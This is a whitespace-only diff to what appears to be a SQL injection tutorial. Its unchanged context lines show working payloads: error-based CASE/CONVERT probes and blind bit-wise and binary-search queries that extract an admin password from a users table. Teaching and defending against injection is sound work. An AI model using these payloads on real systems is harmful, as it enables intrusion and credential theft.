@@ -57,7 +57,7 @@ Example:
 
 ```sql
 SELECT username,
-  CASE 
+  CASE
     WHEN admin = 1 THEN 'Administrator'
     WHEN moderator = 1 THEN 'Moderator'
     ELSE 'Regular User'
@@ -149,10 +149,10 @@ Using conditional logic to force errors that contain data:
 
 ```sql
 -- Using CASE to force a conversion error
-' AND 1=CONVERT(int, 
-    CASE 
-      WHEN (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 THEN 'Yes' 
-      ELSE 'No' 
+' AND 1=CONVERT(int,
+    CASE
+      WHEN (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 THEN 'Yes'
+      ELSE 'No'
     END
   )--
 ```
@@ -171,11 +171,11 @@ Using conditional logic to force errors that contain data:
 ```sql
 -- Extract one character at a time
 ' AND (SELECT ASCII(SUBSTRING(
-    (SELECT TOP 1 password FROM users WHERE username = 'admin'), 
+    (SELECT TOP 1 password FROM users WHERE username = 'admin'),
     1, 1)) & 1) = 1--
 
 ' AND (SELECT ASCII(SUBSTRING(
-    (SELECT TOP 1 password FROM users WHERE username = 'admin'), 
+    (SELECT TOP 1 password FROM users WHERE username = 'admin'),
     1, 1)) & 2) = 2--
 
 -- And so on for each bit...
@@ -186,7 +186,7 @@ Using conditional logic to force errors that contain data:
 ```sql
 -- Binary search approach to extract values efficiently
 ' AND (SELECT ASCII(SUBSTRING(
-    (SELECT TOP 1 password FROM users WHERE username = 'admin'), 
+    (SELECT TOP 1 password FROM users WHERE username = 'admin'),
     1, 1)) < 128)--
 ```
 
